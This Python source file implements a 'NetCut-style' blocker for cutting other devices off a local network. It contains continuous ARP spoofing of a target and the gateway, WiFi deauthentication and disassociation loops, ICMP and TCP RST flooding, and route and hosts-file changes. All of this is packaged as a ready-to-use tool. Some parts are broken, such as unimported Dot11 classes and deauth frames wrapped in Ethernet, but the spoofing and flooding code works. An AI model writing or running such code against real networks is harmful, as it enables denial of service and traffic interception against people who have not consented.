#!/usr/bin/env python3
"""
NetCut-style blocking system for real network disconnection
Uses the same aggressive methods as NetCut to disconnect devices
"""

import socket
import struct
import threading
import time
import platform
import subprocess
import psutil
from typing import Dict, List, Optional
from app.logs.logger import log_info, log_error

try:
    from scapy.all import ARP, Ether, send, srp, sr1, IP, ICMP, TCP, UDP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    log_error("Scapy not available - some NetCut features will be disabled")

class NetCutBlocker:
    """NetCut-style blocking system for real network disconnection"""
    
    def __init__(self):
        self.local_ip = None
        self.local_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.blocked_devices = {}  # IP -> blocking info
        self.arp_threads = {}  # IP -> thread
        self.deauth_threads = {}  # IP -> thread
        self.flood_threads = {}  # IP -> thread
        self.running = False
        self.stop_event = threading.Event()
        
    def initialize(self) -> bool:
        """Initialize NetCut blocker with network information"""
        try:
            log_info("🔧 Initializing NetCut-style blocker...")
            
            # Get local network information
            self._get_local_info()
            self._get_gateway_info()
            
            if not self.local_ip or not self.gateway_ip:
                log_error("❌ Failed to get network information")
                return False
            
            log_info(f"✅ NetCut blocker initialized - Local: {self.local_ip}, Gateway: {self.gateway_ip}")
            return True
            
        except Exception as e:
            log_error(f"❌ NetCut blocker initialization failed: {e}")
            return False
    
    def _get_local_info(self):
        """Get local IP and MAC address"""
        try:
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            
            # Get local MAC
            interfaces = psutil.net_if_addrs()
            for interface_name, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == socket.AF_INET and addr.address == self.local_ip:
                        # Find MAC for this interface
                        for mac_addr in addrs:
                            if mac_addr.family == psutil.AF_LINK:
                                self.local_mac = mac_addr.address.replace('-', ':')
                                break
                        break
                if self.local_mac:
                    break
            
            log_info(f"📡 Local IP: {self.local_ip}, MAC: {self.local_mac}")
            
        except Exception as e:
            log_error(f"❌ Failed to get local info: {e}")
    
    def _get_gateway_info(self):
        """Get gateway IP and MAC address"""
        try:
            # Get gateway IP (usually .1)
            network_parts = self.local_ip.split('.')
            self.gateway_ip = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.1"
            
            # Get gateway MAC using ARP
            if SCAPY_AVAILABLE:
                try:
                    # Send ARP request to gateway
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=1,  # ARP request
                        pdst=self.gateway_ip,
                        psrc=self.local_ip
                    )
                    
                    # Send and wait for response
                    result = srp(arp_request, timeout=2, verbose=False)
                    if result[0]:
                        self.gateway_mac = result[0][0][1].hwsrc
                        log_info(f"📡 Gateway IP: {self.gateway_ip}, MAC: {self.gateway_mac}")
                    else:
                        log_error("❌ Could not get gateway MAC")
                except Exception as e:
                    log_error(f"❌ ARP request failed: {e}")
            else:
                log_error("❌ Scapy not available - cannot get gateway MAC")
                
        except Exception as e:
            log_error(f"❌ Failed to get gateway info: {e}")
    
    def block_device(self, target_ip: str) -> bool:
        """Block a device using NetCut-style methods"""
        try:
            log_info(f"🚫 NetCut blocking device: {target_ip}")
            
            if target_ip in self.blocked_devices:
                log_info(f"⚠️ Device {target_ip} already blocked")
                return True
            
            # Get target MAC if not available
            target_mac = self._get_target_mac(target_ip)
            if not target_mac:
                log_error(f"❌ Could not get MAC for {target_ip}")
                return False
            
            # Start multiple blocking methods
            success = False
            
            # Method 1: ARP Spoofing (NetCut's primary method)
            if self._start_arp_spoofing(target_ip, target_mac):
                success = True
                log_info(f"✅ ARP spoofing started for {target_ip}")
            
            # Method 2: WiFi Deauthentication (if applicable)
            if self._start_deauth_attack(target_ip, target_mac):
                success = True
                log_info(f"✅ Deauth attack started for {target_ip}")
            
            # Method 3: Traffic Flooding
            if self._start_traffic_flood(target_ip):
                success = True
                log_info(f"✅ Traffic flood started for {target_ip}")
            
            # Method 4: Route Poisoning
            if self._poison_routes(target_ip):
                success = True
                log_info(f"✅ Route poisoning for {target_ip}")
            
            if success:
                self.blocked_devices[target_ip] = {
                    'mac': target_mac,
                    'blocked_at': time.time(),
                    'methods': ['arp_spoof', 'deauth', 'flood', 'route_poison']
                }
                log_info(f"🎯 NetCut blocking successful for {target_ip}")
                return True
            else:
                log_error(f"❌ All NetCut blocking methods failed for {target_ip}")
                return False
                
        except Exception as e:
            log_error(f"❌ NetCut blocking failed for {target_ip}: {e}")
            return False
    
    def unblock_device(self, target_ip: str) -> bool:
        """Unblock a device"""
        try:
            log_info(f"🔓 NetCut unblocking device: {target_ip}")
            
            if target_ip not in self.blocked_devices:
                log_info(f"⚠️ Device {target_ip} not blocked")
                return True
            
            # Stop all blocking threads
            self._stop_blocking_threads(target_ip)
            
            # Remove from blocked devices
            del self.blocked_devices[target_ip]
            
            log_info(f"✅ NetCut unblocking successful for {target_ip}")
            return True
            
        except Exception as e:
            log_error(f"❌ NetCut unblocking failed for {target_ip}: {e}")
            return False
    
    def _get_target_mac(self, target_ip: str) -> Optional[str]:
        """Get target MAC address"""
        try:
            if SCAPY_AVAILABLE:
                # Send ARP request
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=1,  # ARP request
                    pdst=target_ip,
                    psrc=self.local_ip
                )
                
                result = srp(arp_request, timeout=2, verbose=False)
                if result[0]:
                    return result[0][0][1].hwsrc
                else:
                    log_error(f"❌ Could not get MAC for {target_ip}")
                    return None
            else:
                log_error("❌ Scapy not available - cannot get target MAC")
                return None
                
        except Exception as e:
            log_error(f"❌ Failed to get target MAC: {e}")
            return None
    
    def _start_arp_spoofing(self, target_ip: str, target_mac: str) -> bool:
        """Start ARP spoofing (NetCut's primary method)"""
        try:
            if not SCAPY_AVAILABLE:
                return False
            
            # Create ARP spoofing thread
            thread = threading.Thread(
                target=self._arp_spoof_loop,
                args=(target_ip, target_mac),
                daemon=True
            )
            thread.start()
            self.arp_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"❌ ARP spoofing failed: {e}")
            return False
    
    def _arp_spoof_loop(self, target_ip: str, target_mac: str):
        """ARP spoofing loop - sends fake ARP packets"""
        try:
            log_info(f"🔄 Starting ARP spoofing loop for {target_ip}")
            
            while not self.stop_event.is_set() and target_ip in self.blocked_devices:
                try:
                    # Method 1: Tell target that we are the gateway
                    arp_packet1 = Ether(dst=target_mac) / ARP(
                        op=2,  # ARP reply
                        psrc=self.gateway_ip,  # We claim to be gateway
                        pdst=target_ip,
                        hwsrc=self.local_mac,  # Our MAC
                        hwdst=target_mac
                    )
                    send(arp_packet1, verbose=False)
                    
                    # Method 2: Tell gateway that target is us
                    if self.gateway_mac:
                        arp_packet2 = Ether(dst=self.gateway_mac) / ARP(
                            op=2,  # ARP reply
                            psrc=target_ip,  # We claim to be target
                            pdst=self.gateway_ip,
                            hwsrc=self.local_mac,  # Our MAC
                            hwdst=self.gateway_mac
                        )
                        send(arp_packet2, verbose=False)
                    
                    # Method 3: Send gratuitous ARP to confuse
                    gratuitous_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2,  # ARP reply
                        psrc=target_ip,
                        pdst=target_ip,
                        hwsrc="00:00:00:00:00:00",  # Invalid MAC
                        hwdst="ff:ff:ff:ff:ff:ff"
                    )
                    send(gratuitous_arp, verbose=False)
                    
                    time.sleep(0.1)  # Send packets every 100ms
                    
                except Exception as e:
                    log_error(f"❌ ARP spoofing error: {e}")
                    time.sleep(1)
            
            log_info(f"🛑 ARP spoofing stopped for {target_ip}")
            
        except Exception as e:
            log_error(f"❌ ARP spoofing loop failed: {e}")
    
    def _start_deauth_attack(self, target_ip: str, target_mac: str) -> bool:
        """Start WiFi deauthentication attack"""
        try:
            if not SCAPY_AVAILABLE:
                return False
            
            # Create deauth thread
            thread = threading.Thread(
                target=self._deauth_loop,
                args=(target_ip, target_mac),
                daemon=True
            )
            thread.start()
            self.deauth_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"❌ Deauth attack failed: {e}")
            return False
    
    def _deauth_loop(self, target_ip: str, target_mac: str):
        """Deauthentication loop"""
        try:
            log_info(f"🔄 Starting deauth attack for {target_ip}")
            
            while not self.stop_event.is_set() and target_ip in self.blocked_devices:
                try:
                    # Send deauthentication packets
                    deauth_packet = Ether(dst=target_mac) / Dot11(
                        addr1=target_mac,
                        addr2=self.local_mac,
                        addr3=self.local_mac
                    ) / Dot11Deauth()
                    
                    send(deauth_packet, verbose=False)
                    
                    # Send disassociation packets
                    disas_packet = Ether(dst=target_mac) / Dot11(
                        addr1=target_mac,
                        addr2=self.local_mac,
                        addr3=self.local_mac
                    ) / Dot11Disas()
                    
                    send(disas_packet, verbose=False)
                    
                    time.sleep(0.05)  # Send very frequently
                    
                except Exception as e:
                    log_error(f"❌ Deauth error: {e}")
                    time.sleep(1)
            
            log_info(f"🛑 Deauth attack stopped for {target_ip}")
            
        except Exception as e:
            log_error(f"❌ Deauth loop failed: {e}")
    
    def _start_traffic_flood(self, target_ip: str) -> bool:
        """Start traffic flooding"""
        try:
            # Create flood thread
            thread = threading.Thread(
                target=self._traffic_flood_loop,
                args=(target_ip,),
                daemon=True
            )
            thread.start()
            self.flood_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"❌ Traffic flood failed: {e}")
            return False
    
    def _traffic_flood_loop(self, target_ip: str):
        """Traffic flooding loop"""
        try:
            log_info(f"🔄 Starting traffic flood for {target_ip}")
            
            while not self.stop_event.is_set() and target_ip in self.blocked_devices:
                try:
                    # Send ICMP flood
                    if SCAPY_AVAILABLE:
                        icmp_packet = IP(dst=target_ip) / ICMP()
                        send(icmp_packet, verbose=False)
                    
                    # Send TCP RST packets to common ports
                    common_ports = [80, 443, 22, 21, 23, 25, 53, 110, 143, 993, 995]
                    for port in common_ports:
                        if SCAPY_AVAILABLE:
                            tcp_packet = IP(dst=target_ip) / TCP(dport=port, flags="R")
                            send(tcp_packet, verbose=False)
                    
                    time.sleep(0.01)  # Very fast flooding
                    
                except Exception as e:
                    log_error(f"❌ Traffic flood error: {e}")
                    time.sleep(1)
            
            log_info(f"🛑 Traffic flood stopped for {target_ip}")
            
        except Exception as e:
            log_error(f"❌ Traffic flood loop failed: {e}")
    
    def _poison_routes(self, target_ip: str) -> bool:
        """Poison routing tables"""
        try:
            if platform.system().lower() == "windows":
                # Add route to null interface
                subprocess.run([
                    "route", "add", target_ip, "0.0.0.0", "if", "1", "metric", "1"
                ], capture_output=True, timeout=3)
                
                # Add to hosts file
                hosts_entry = f"{target_ip} 127.0.0.1"
                subprocess.run([
                    "echo", hosts_entry, ">>", "C:\\Windows\\System32\\drivers\\etc\\hosts"
                ], shell=True, capture_output=True, timeout=3)
            
            return True
            
        except Exception as e:
            log_error(f"❌ Route poisoning failed: {e}")
            return False
    
    def _stop_blocking_threads(self, target_ip: str):
        """Stop all blocking threads for a target"""
        try:
            # Stop ARP spoofing
            if target_ip in self.arp_threads:
                del self.arp_threads[target_ip]
            
            # Stop deauth attack
            if target_ip in self.deauth_threads:
                del self.deauth_threads[target_ip]
            
            # Stop traffic flood
            if target_ip in self.flood_threads:
                del self.flood_threads[target_ip]
            
            log_info(f"🛑 Stopped all blocking threads for {target_ip}")
            
        except Exception as e:
            log_error(f"❌ Failed to stop blocking threads: {e}")
    
    def get_blocked_devices(self) -> List[str]:
        """Get list of blocked devices"""
        return list(self.blocked_devices.keys())
    
    def is_device_blocked(self, target_ip: str) -> bool:
        """Check if device is blocked"""
        return target_ip in self.blocked_devices
    
    def clear_all_disruptions(self) -> bool:
        """Clear all NetCut disruptions and restore network"""
        try:
            log_info("🧹 Clearing all NetCut disruptions...")
            
            # Stop all blocking threads
            for target_ip in list(self.arp_threads.keys()):
                self._stop_blocking_threads(target_ip)
            
            # Clear blocked devices
            self.blocked_devices.clear()
            
            # Clear thread dictionaries
            self.arp_threads.clear()
            self.deauth_threads.clear()
            self.flood_threads.clear()
            
            # Stop the main blocker
            self.stop()
            
            log_info("✅ All NetCut disruptions cleared")
            return True
            
        except Exception as e:
            log_error(f"❌ Failed to clear NetCut disruptions: {e}")
            return False
    
    def start(self):
        """Start the NetCut blocker"""
        self.running = True
        self.stop_event.clear()
        log_info("🚀 NetCut blocker started")
    
    def stop(self):
        """Stop the NetCut blocker"""
        self.running = False
        self.stop_event.set()
        
        # Stop all threads
        for target_ip in list(self.blocked_devices.keys()):
            self._stop_blocking_threads(target_ip)
        
        self.blocked_devices.clear()
        log_info("🛑 NetCut blocker stopped")

# Global instance
netcut_blocker = NetCutBlocker() 